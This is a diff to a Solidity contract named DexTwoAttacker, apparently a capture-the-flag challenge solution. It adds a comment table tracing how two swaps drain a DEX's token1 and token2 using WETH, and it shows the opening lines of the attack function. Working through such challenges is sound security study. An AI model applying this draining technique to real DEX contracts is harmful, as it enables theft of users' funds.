@@ -36,7 +36,15 @@ contract DexTwoAttacker {
     constructor(address _challengeInstance) payable {
         challengeInstance = _challengeInstance;
     }
-
+    
+    /** 
+     *     Step  |           DEX          |          Player  
+     *           | token1 - token2 - WETH | token1 - token2 - WETH
+     *   ---------------------------------------------------------
+     *     Init  |   100     100     100  |    10      10     300
+     *   Swap 1  |     0     100     200  |   110      10     200
+     *   Swap 2  |     0       0     400  |   110     110       0
+     */
     function attack() external {
         IWETH(WETH_ADDRESS).deposit{value: 400}();
         IERC20(WETH_ADDRESS).transfer(challengeInstance, 100);
